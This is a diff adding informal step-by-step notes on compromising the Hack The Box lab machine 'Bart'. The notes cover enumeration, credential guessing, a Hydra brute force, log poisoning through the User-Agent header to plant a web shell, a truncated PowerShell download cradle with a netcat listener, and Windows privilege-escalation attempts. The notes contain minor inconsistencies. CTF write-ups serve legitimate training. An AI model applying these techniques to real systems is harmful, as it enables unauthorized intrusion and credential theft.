@@ -1,0 +1,83 @@
+Hack the box - Bart
+
+1. Run full Nmap scan - Port 80 open , service HTTP Microsoft IIS httpd 10.0
+
+2. Google "windows IIS version to OS"  Found IIS 8.0 corresponds to windows 2012 (No useful info)
+
+3. Run Gobuster / FFUF,  no proper output as expeted, results shows 200 for everything
+
+4. So we CURL on the target with command "curl -vvv 10.10.10.80", we found redirect
+URL with 302 response. we found [target]/forum
+
+5. [target]/forum redirects to forum.bart.htb, so edit hostfile to 10.10.10.81 add the url
+
+6. After editing hostfile, open forum.bart.htb and check in bottom it is mentioned as
+wordpress.Search for wp-content, wp-plugin in view source. /wp-admin page also
+
+7. Check comments in the source code - we find "harvy potter" in source code
+
+8.In gobuster, we got [target]/moniter, redirects to bart.htb.monitor
+
+9. Check forgot password to enumerate username, check with "harvey", alert message says
+email is received
+
+10. check harvey:potter credentials to login -> it is successful
+
+11. Another link find after login -> internal-01.bart.htb
+
+12. Here we need to use hydra brutforcer, "Harvey" with password not working (No csrf token in login page)
+
+13. Run Hydra brute-force scan "http-post-form", add redirect to [target] and port 80 in burp
+And run Hydra at target 127.0.0.1
+
+14. Use the worlist "/commonroots.txt" from metasploit --> finally one of the password worked
+
+15. Login with the password got from Hydra result. Check source code for a wurl with log.php directory
+
+16. Add parameter ?filename=log&username=harvey , response body gives logged user-agent
+
+17. So in burp, add user-agent with 1 line simple shell
+
+18. add any parameter in request, ?filename=log&username=harvey&test=whoami , it gives results of current user
+
+19. Now use Invoke-shell windows commands for file transfer and listen with netcat
+
+20. add the parameter test=Powershell 'IE(New-object.....)', this invokes powershell and runs
+command
+
+20. We can get a shell, here we run JAWS (Just another windows enumberation script) in the shell we got
+21. Run PowerUp.ps1, it is giving errors. Try running individual function from the script
+still we are getting the error messages for 2 function for AuoAdminLogin register and Autologin password
+
+22.Now we try registry redirector, it gives error that registry doesn't exist. 
+
+23. Checking if the OS is 32 or 64 bit with command - [enviroment]::Is64BitOperatingSystem,
+
+It returns True
+
+[enviroment]::Is64BitProcess   // since it is 32 bit process
+It returns false
+
+24. Now we try to access "sysnative" folder - default in 64 bit OS , 32 bit process
+
+25. Sysnative is not found via directory list command, May be it is hidden
+
+26. Now add test=C:\Windows\SysNative\Windowspowershell\v1.0\Powershell 'IE(New-object.....)'
+
+27. Still "Sysnative" is not found, so we move away from this process
+
+28. Check "whoami /all" is shows privelage with "Impersonate a client after authentication"
+Here we can run JuicyPotato exploit to get the previlages.
+
+
+29. Get-RegistryAutoLogon , it displays administrator password
+
+30. Goto FuzzySecurity github - Download PowerShell-Suite/InvokeRunAs.ps1
+
+31. None of them works. So now use impact to login with SMB, make sure portforwarding is done
+
+32. Use meterpreter exploit/windows/smb/smb delivery , but it is metasploit and involves a port 
+forwarding
+
+
+	
